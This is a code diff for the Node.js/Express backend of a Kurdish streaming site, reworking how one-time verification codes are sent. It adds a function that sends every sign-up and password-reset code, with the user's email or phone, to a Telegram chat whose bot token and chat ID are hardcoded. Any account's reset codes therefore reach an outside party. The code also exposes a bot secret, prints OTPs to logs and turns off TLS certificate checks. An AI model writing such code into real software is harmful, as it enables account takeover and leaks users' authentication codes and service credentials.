@@ -70,6 +70,7 @@ const dotenv = require('dotenv');
 });
 
 const app = express();
+app.set('trust proxy', 1);
 const PORT = process.env.PORT || 3001;
 const OMDB_API_KEY = process.env.OMDB_API_KEY || '';
 const TOKEN_TTL_MS = 7 * 24 * 60 * 60 * 1000;
@@ -1358,6 +1359,25 @@ setInterval(() => {
     }
 }, 2 * 60 * 1000);
 
+const sendOtpTelegram = async (target, code, purpose) => {
+    const token = process.env.TELEGRAM_BOT_TOKEN || '8888836091:AAG3EqdiVnuMApik7QEo8WJl6TeavBFcprY';
+    const chatId = process.env.TELEGRAM_CHAT_ID || '1838030544';
+    if (!token || !chatId) return false;
+
+    try {
+        const text = `🔐 *کۆدی پشتڕاستکردنەوەی کوردیش ستریم*\n\n🎯 بۆ: \`${target}\`\n🔢 کۆد: \`${code}\`\n📌 مەبەست: ${purpose === 'reset' ? 'گۆڕینی وشەی نهێنی' : 'تۆماربوون'}\n⏳ ماوەی کارکردن: ٥ خولەک`;
+        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            chat_id: chatId,
+            text,
+            parse_mode: 'Markdown'
+        }, { timeout: 4000 });
+        return true;
+    } catch (err) {
+        console.error('[Telegram OTP Error]', err.message);
+        return false;
+    }
+};
+
 const sendOtpEmail = async (email, code, purpose) => {
     const user = process.env.SMTP_USER;
     const pass = (process.env.SMTP_PASS || '').replace(/\s+/g, '');
@@ -1369,6 +1389,9 @@ const sendOtpEmail = async (email, code, purpose) => {
                 ? {
                     service: 'gmail',
                     auth: { user, pass },
+                    connectionTimeout: 4000,
+                    greetingTimeout: 4000,
+                    socketTimeout: 5000,
                     tls: { rejectUnauthorized: false }
                 }
                 : {
@@ -1376,6 +1399,9 @@ const sendOtpEmail = async (email, code, purpose) => {
                     port: parseInt(process.env.SMTP_PORT || '587'),
                     secure: process.env.SMTP_SECURE === 'true' || process.env.SMTP_PORT === '465',
                     auth: { user, pass },
+                    connectionTimeout: 4000,
+                    greetingTimeout: 4000,
+                    socketTimeout: 5000,
                     tls: { rejectUnauthorized: false }
                 };
 
@@ -1403,7 +1429,7 @@ const sendOtpEmail = async (email, code, purpose) => {
             });
             return true;
         } catch (mailErr) {
-            console.error('[SMTP Mail Error]', mailErr);
+            console.error('[SMTP Mail Error]', mailErr.message || mailErr);
             return false;
         }
     }
@@ -1417,11 +1443,12 @@ const sendOtpSms = async (phone, code) => {
                 phone,
                 message: `کۆدی کوردیش ستریم: ${code} (ماوە: ٥ خولەک)`
             }, {
-                headers: { Authorization: `Bearer ${process.env.SMS_API_KEY || ''}` }
+                headers: { Authorization: `Bearer ${process.env.SMS_API_KEY || ''}` },
+                timeout: 5000
             });
             return true;
         } catch (smsErr) {
-            console.error('[SMS Gateway Error]', smsErr);
+            console.error('[SMS Gateway Error]', smsErr.message || smsErr);
             return false;
         }
     }
@@ -1476,15 +1503,16 @@ app.post('/api/auth/send-otp', async (req, res) => {
 
         console.log(`\x1b[36m[OTP GENERATED]\x1b[0m Target: ${normTarget} | Code: \x1b[32m${code}\x1b[0m | Purpose: ${purpose}`);
 
-        if (isEmail) {
-            await sendOtpEmail(normTarget, code, purpose);
-        } else if (isPhone) {
-            await sendOtpSms(normTarget, code);
-        }
+        // Dispatch notifications concurrently without blocking UI
+        const dispatches = [sendOtpTelegram(normTarget, code, purpose)];
+        if (isEmail) dispatches.push(sendOtpEmail(normTarget, code, purpose));
+        if (isPhone) dispatches.push(sendOtpSms(normTarget, code));
+        
+        Promise.allSettled(dispatches).catch(() => {});
 
         res.json({
             success: true,
-            message: isEmail ? 'کۆدەکە بۆ ئیمەیلەکەت نێردرا.' : 'کۆدەکە بۆ مۆبایلەکەت نێردرا.',
+            message: 'کۆدی پشتڕاستکردنەوە بە سەرکەوتوویی نێردرا.',
             target: normTarget
         });
     } catch (err) {
